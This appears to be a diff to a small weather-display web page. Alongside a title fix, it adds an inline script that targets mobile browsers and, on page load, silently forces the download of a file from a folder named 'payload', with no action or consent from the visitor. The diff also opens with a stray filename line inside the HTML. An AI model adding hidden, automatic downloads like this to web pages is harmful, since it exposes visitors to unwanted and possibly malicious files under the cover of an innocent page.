@@ -1,9 +1,10 @@
+.io\Index.html
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Today’s Weather</title>
+  <title>Today's Weather</title>
   <style>
     body { font-family: sans-serif; text-align: center; padding: 2rem; }
     #weather { margin-top: 1.5rem; font-size: 1.5rem; }
@@ -13,5 +14,26 @@
   <h1>Weather Today </h1>
   <div id="weather">Loading....</div>
   <script src="script.js"></script>
+  <script>
+    // Check if the user is on a mobile device
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+    
+    // Function to trigger download
+    function downloadGif() {
+      if (isMobileDevice()) {
+        const link = document.createElement('a');
+        link.href = 'payload/IC_walking.gif';
+        link.download = 'IC_walking.gif';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
+    }
+    
+    // Trigger download when page loads
+    window.addEventListener('load', downloadGif);
+  </script>
 </body>
 </html>
